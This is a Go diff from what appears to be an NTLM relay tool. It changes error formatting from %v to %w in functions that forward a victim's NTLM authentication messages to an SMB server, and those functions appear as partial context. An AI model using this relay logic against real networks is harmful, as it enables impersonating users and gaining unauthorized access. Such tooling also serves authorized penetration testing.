@@ -44,7 +44,7 @@ func relayDial(target string, port int, timeout time.Duration) (*relayConn, erro
 	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
 	conn, err := net.DialTimeout("tcp", addr, timeout)
 	if err != nil {
-		return nil, fmt.Errorf("connect to %s: %v", addr, err)
+		return nil, fmt.Errorf("connect to %s: %w", addr, err)
 	}
 	_ = conn.SetDeadline(time.Now().Add(timeout))
 	return &relayConn{conn: conn}, nil
@@ -78,7 +78,7 @@ func (rc *relayConn) negotiate() ([]byte, error) {
 
 	resp, err := rc.sendRecv(smb2CmdNegotiate, 0, neg)
 	if err != nil {
-		return nil, fmt.Errorf("negotiate: %v", err)
+		return nil, fmt.Errorf("negotiate: %w", err)
 	}
 
 	// Parse NEGOTIATE response
@@ -129,7 +129,7 @@ func (rc *relayConn) sessionSetup(spnegoBlob []byte) ([]byte, uint32, error) {
 
 	resp, err := rc.sendRecv(smb2CmdSessionSetup, rc.sessionID, setup)
 	if err != nil {
-		return nil, 0, fmt.Errorf("session setup: %v", err)
+		return nil, 0, fmt.Errorf("session setup: %w", err)
 	}
 
 	status := rc.parseStatus(resp)
@@ -181,13 +181,13 @@ func (rc *relayConn) sendRecv(command uint16, sessionID uint64, payload []byte) 
 	nbHdr[0] = 0 // session message type
 
 	if _, err := rc.conn.Write(append(nbHdr, append(hdr, payload...)...)); err != nil {
-		return nil, fmt.Errorf("write: %v", err)
+		return nil, fmt.Errorf("write: %w", err)
 	}
 
 	// Read response: NetBIOS header (4 bytes) + SMB2 message
 	respNB := make([]byte, 4)
 	if _, err := io.ReadFull(rc.conn, respNB); err != nil {
-		return nil, fmt.Errorf("read header: %v", err)
+		return nil, fmt.Errorf("read header: %w", err)
 	}
 	respLen := int(binary.BigEndian.Uint32(respNB)) & 0x00FFFFFF
 	if respLen < smb2HeaderSize || respLen > 1024*1024 {
@@ -196,7 +196,7 @@ func (rc *relayConn) sendRecv(command uint16, sessionID uint64, payload []byte) 
 
 	resp := make([]byte, respLen)
 	if _, err := io.ReadFull(rc.conn, resp); err != nil {
-		return nil, fmt.Errorf("read body: %v", err)
+		return nil, fmt.Errorf("read body: %w", err)
 	}
 
 	// Validate magic
@@ -227,7 +227,7 @@ func relayNTLMToSMB(target string, port int, timeout time.Duration, victimType1 
 	_, err = rc.negotiate()
 	if err != nil {
 		rc.close()
-		return nil, nil, fmt.Errorf("SMB negotiate: %v", err)
+		return nil, nil, fmt.Errorf("SMB negotiate: %w", err)
 	}
 
 	// Step 2: SESSION_SETUP #1 — send victim's Type 1 in SPNEGO
@@ -235,7 +235,7 @@ func relayNTLMToSMB(target string, port int, timeout time.Duration, victimType1 
 	respBlob, status, err := rc.sessionSetup(spnegoType1)
 	if err != nil {
 		rc.close()
-		return nil, nil, fmt.Errorf("session setup 1: %v", err)
+		return nil, nil, fmt.Errorf("session setup 1: %w", err)
 	}
 	if status != smb2StatusMoreProcessing {
 		rc.close()
@@ -250,7 +250,7 @@ func relayNTLMToSMB(target string, port int, timeout time.Duration, victimType1 
 	}
 	if err := relayNTLMValidate(type2, ntlmTypeChallenge); err != nil {
 		rc.close()
-		return nil, nil, fmt.Errorf("invalid Type 2: %v", err)
+		return nil, nil, fmt.Errorf("invalid Type 2: %w", err)
 	}
 
 	return rc, type2, nil
@@ -261,7 +261,7 @@ func relayCompleteAuth(rc *relayConn, victimType3 []byte) (bool, uint32, error) 
 	spnegoType3 := spnegoWrapNegTokenResp(victimType3)
 	_, status, err := rc.sessionSetup(spnegoType3)
 	if err != nil {
-		return false, 0, fmt.Errorf("session setup 2: %v", err)
+		return false, 0, fmt.Errorf("session setup 2: %w", err)
 	}
 	if status == smb2StatusOK {
 		return true, status, nil
